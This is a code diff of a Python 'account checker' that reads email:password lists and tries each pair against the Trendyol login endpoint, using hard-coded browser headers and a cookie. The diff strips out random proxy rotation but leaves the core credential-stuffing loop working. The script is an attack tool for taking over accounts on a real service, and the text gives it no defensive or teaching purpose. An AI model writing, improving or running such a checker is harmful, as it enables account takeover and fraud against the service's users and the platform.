@@ -1,12 +1,10 @@
 import requests
 import json
-import random
 from colorama import Fore, Style, init
 
 # Colorama'yı başlat
 init(autoreset=True)
-#@versa
-#@veraildez
+
 # VERSA logosu
 def print_logo():
     logo = """
@@ -16,16 +14,7 @@ def print_logo():
     """
     print(Fore.BLUE + Style.BRIGHT + logo)
 
-def load_proxies(file_path):
-    try:
-        with open(file_path, 'r') as file:
-            proxies = file.readlines()
-            return [proxy.strip() for proxy in proxies if proxy.strip()]  # Boş satırları hariç tut
-    except FileNotFoundError:
-        print(Fore.RED + "Proxy dosyası bulunamadı. Lütfen geçerli bir dosya yolu girin.")
-        return []
-
-def check_accounts(file_path, proxy_file_path):
+def check_accounts(file_path):
     url = "https://auth.trendyol.com/login"
 
     headers = {
@@ -48,12 +37,6 @@ def check_accounts(file_path, proxy_file_path):
         'Cookie': "anonUserId=da5f0f00-8a59-11ef-9ed2-99b241f7b34e; platform=mweb; m=1; sm=1; ..."
     }
 
-    # Proxileri yükle
-    proxies = load_proxies(proxy_file_path)
-    if not proxies:
-        print(Fore.RED + "Proxy bulunamadı, işlem sonlandırılıyor.")
-        return
-
     try:
         with open(file_path, 'r') as file:
             accounts = file.readlines()
@@ -65,22 +48,13 @@ def check_accounts(file_path, proxy_file_path):
         # E-posta ve şifreyi ayır
         email, password = account.strip().split(':')
 
-        # Rastgele bir proxy seç
-        proxy = random.choice(proxies)
-
-        # Proxy ayarlarını yap
-        proxy_dict = {
-            "http": proxy,
-            "https": proxy,
-        }
-
         payload = json.dumps({
             "email": email,
             "password": password
         })
 
         try:
-            response = requests.post(url, data=payload, headers=headers, proxies=proxy_dict)
+            response = requests.post(url, data=payload, headers=headers)
             # Yanıtı kontrol et
             if response.status_code == 200:
                 response_data = response.json()
@@ -96,7 +70,6 @@ def check_accounts(file_path, proxy_file_path):
 # Logo ilk önce yazdır
 print_logo()
 
-# Kullanıcıdan dosya yollarını al
+# Kullanıcıdan dosya yolunu al
 account_file_path = input(Fore.CYAN + Style.BRIGHT + "Hesapların bulunduğu dosyanın tam yolunu girin: ")
-proxy_file_path = input(Fore.CYAN + Style.BRIGHT + "Proxilerin bulunduğu dosyanın tam yolunu girin: ")
-check_accounts(account_file_path, proxy_file_path)
+check_accounts(account_file_path)
